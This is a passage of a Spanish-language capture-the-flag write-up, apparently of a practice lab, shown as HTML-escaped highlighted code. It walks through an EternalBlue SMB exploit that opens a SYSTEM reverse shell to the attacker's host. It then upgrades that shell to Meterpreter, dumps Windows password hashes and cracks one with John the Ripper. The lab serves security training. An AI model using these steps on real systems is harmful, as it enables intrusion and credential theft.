&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - 0x00000020  &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; 6b &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;                    ice Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;      
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Target arch selected valid &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; arch indicated by DCE/RPC reply
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Trying exploit with &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; Groom Allocations.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Sending all but last fragment of exploit packet
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Starting non-paged pool grooming
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Sending SMBv2 buffers
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Sending final SMBv2 buffers.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Sending last fragment of exploit packet!
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Receiving response from exploit packet
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - ETERNALBLUE overwrite completed successfully &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xC000000D&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;!
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Sending egg to corrupted connection.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - Triggering free of corrupted buffer.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.8.1.72:4444 -&amp;gt; 10.10.24.91:49196&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-03 21:15:49 -0400
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-WIN-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.24.91:445 - &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;



C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;upgrade-shell---meterpreter&#34;&gt;UPGRADE SHELL - METERPRETER&lt;/h2&gt;
&lt;p&gt;Utilizamos el eexploit de post explotacion &lt;strong&gt;multi/manage/shell_to_meterpreter&lt;/strong&gt; para actualizar nuestra shell a meterpreter.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; sessions 

Active &lt;span class=&#34;nv&#34;&gt;sessions&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============&lt;/span&gt;

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;         shell x64/windows  Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 6.1.7601&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation...  10.8.1.72:4444 -&amp;gt; 10.10.24.91:49196 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.24.91&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; search shell_to_meterpreter

Matching &lt;span class=&#34;nv&#34;&gt;Modules&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;================&lt;/span&gt;

   &lt;span class=&#34;c1&#34;&gt;#  Name                                    Disclosure Date  Rank    Check  Description&lt;/span&gt;
   -  ----                                    ---------------  ----    -----  -----------
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; use post/multi/manage/shell_to_meterpreter
msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;post/multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Will try to auto detect&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
   LPORT    &lt;span class=&#34;m&#34;&gt;4433&lt;/span&gt;             yes       Port &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Upgrading session ID: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting exploit/multi/handler
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.8.1.72:4433 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Post module execution completed
msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending stage &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;179779&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to 10.10.24.91
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.8.1.72:4433 -&amp;gt; 10.10.24.91:49203&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-03 21:21:37 -0400
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stopping exploit/multi/handler

msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; sessions 

Active &lt;span class=&#34;nv&#34;&gt;sessions&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============&lt;/span&gt;

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;         shell x64/windows        Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 6.1.7601&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation...  10.8.1.72:4444 -&amp;gt; 10.10.24.91:49196 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.24.91&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;         meterpreter x86/windows  NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM @ JON-PC                                                      10.8.1.72:4433 -&amp;gt; 10.10.24.91:49203 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.24.91&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;metasploit---hashdump&#34;&gt;METASPLOIT - HASHDUMP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meterpreter &amp;gt; run post/windows/gather/hashdump 

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Obtaining the boot key...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Obtaining the user list and keys...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Decrypting user keys...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping password hints...

Jon:&lt;span class=&#34;s2&#34;&gt;&amp;#34;Nah boi, I ain&amp;#39;t sharing nutting with you&amp;#34;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;john---crack-passwords&#34;&gt;JOHN - CRACK PASSWORDS&lt;/h2&gt;
&lt;p&gt;Crackeamos las contraseñas con john.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/trymehack/blue# john hashes --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NT
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; password hashes with no different salts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NT &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 128/128 AVX 4x3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Warning: no OpenMP support &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; this &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; type, consider --fork&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
                 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Administrator&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
alqfna22         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Jon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
2g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2019-09-03 21:34&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2.061g/s 10515Kp/s 10515Kc/s 10520KC/s alqui..alpusidi
Warning: passwords printed above might not be all those cracked
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=NT&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
Session completed
root@kali:~/trymehack/blue#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;flags&#34;&gt;FLAGS&lt;/h2&gt;
&lt;p&gt;Encontrando las flags.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
